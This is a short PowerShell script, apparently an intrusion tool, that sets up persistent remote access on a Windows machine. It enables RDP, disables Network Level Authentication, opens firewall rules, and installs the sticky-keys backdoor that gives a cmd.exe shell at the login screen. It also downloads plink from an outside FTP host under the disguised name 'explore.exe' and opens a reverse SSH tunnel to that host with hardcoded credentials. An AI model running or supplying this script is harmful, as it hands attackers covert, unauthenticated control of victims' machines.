# Enable RDP
Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -Value 0

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Enable default Windows Firewall rules for RDP
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# Sticky keys
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"

# Download PLink from my FTP Server
(New-Object System.Net.WebClient).DownloadFile('ftp://10.1.149.150:21/plink32', 'C:/Windows/System32/explore.exe')

# Generate a random port to use for RDP Port Forward
$port = Get-Random -Minimum 2000 -Maximum 65000
$c = "C:/Windows/System32/explore.exe -hostkey dc:04:bf:44:47:98:c1:e2:c0:2e:cb:5d:3b:aa:bf:6f -batch -N -R $($port.toString()):127.0.0.1:3389 10.1.149.150 -l toor -pw password1!"
powershell.exe -c $c